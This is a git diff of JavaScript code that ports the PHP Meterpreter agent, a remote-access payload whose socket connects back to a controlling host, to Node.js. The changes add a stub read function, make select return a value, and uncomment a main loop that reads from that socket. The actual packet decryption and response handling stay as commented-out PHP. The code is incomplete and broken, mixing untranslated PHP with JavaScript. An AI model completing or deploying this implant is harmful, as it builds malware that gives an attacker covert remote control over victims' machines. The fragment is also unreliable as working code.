@@ -78,6 +78,25 @@ function add_reader(resource) {
   }
 }
 
+//read function similar to php
+
+function read(resource,len = null) {
+   	
+  if (len == null) {
+    len = 8192;
+  }
+  var buff = '';
+  if (resource.constructor.name == 'Socket'){
+    my_print("Reading TCP socket");
+    /*
+    $buff .= socket_read($resource, $len, PHP_BINARY_READ);
+    my_print(sprintf("Read %d bytes", strlen($buff)));
+    return $buff;
+    */
+}
+   
+}
+
 /*
 function run_cmd(cmd, args, callBack ) {
     var spawn = require('child_process').spawn;
@@ -91,6 +110,7 @@ function run_cmd(cmd, args, callBack ) {
 
 
 // Select function similar to PHP meterpreter 
+
 function select( va, tv_sec = 0, tv_usec = 0) {
 		
 streams_r = [];
@@ -151,6 +171,8 @@ if (n_sockets > 0) {
     va.c = va.c.concat(socketse);
   }
 }
+
+return 1;
 		
 		
 }
@@ -169,7 +191,7 @@ function connect(ipaddr, port) {
     process.exit()
   });
   my_print("Got a sock: "+sock);
-    return sock;
+  return sock;
 }
 
 if (typeof msgsock == "undefined") {
@@ -189,29 +211,30 @@ t = 1;
 
 var combine = {a:r,b:w,c:e,d:t};
 
-/*
+
 while (false !== (cnt = select(combine))) {
   read_failed = false;
   for (i = 0; i < cnt; i++) {
     ready = r[i];
     if (ready == msgsock) {
       packet = read(msgsock, 32);
-      if (false == $packet) {
-        my_print("Read failed on main socket, bailing");
-        break 2;
-      }
-      $xor = substr($packet, 0, 4);
-      $header = xor_bytes($xor, substr($packet, 4, 28));
-      $len_array = unpack("Nlen", substr($header, 20, 4));
-      $len = $len_array['len'] + 32 - 8;
-      while (strlen($packet) < $len) {
-        $packet .= read($msgsock, $len - strlen($packet));
-      }
-      $response = create_response(decrypt_packet(xor_bytes($xor, $packet)));
-      write_tlv_to_socket($msgsock, $response);
     }
-  }
- 
+    /*
+    $xor = substr($packet, 0, 4);
+    $header = xor_bytes($xor, substr($packet, 4, 28));
+    $len_array = unpack("Nlen", substr($header, 20, 4));
+    $len = $len_array['len'] + 32 - 8;
+    while (strlen($packet) < $len) {
+      $packet .= read($msgsock, $len - strlen($packet));
+    }
+    
+    $response = create_response(decrypt_packet(xor_bytes($xor, $packet)));
+    write_tlv_to_socket($msgsock, $response);
+    */
+    }
 }
- */
+
+ 
+
+ 
 
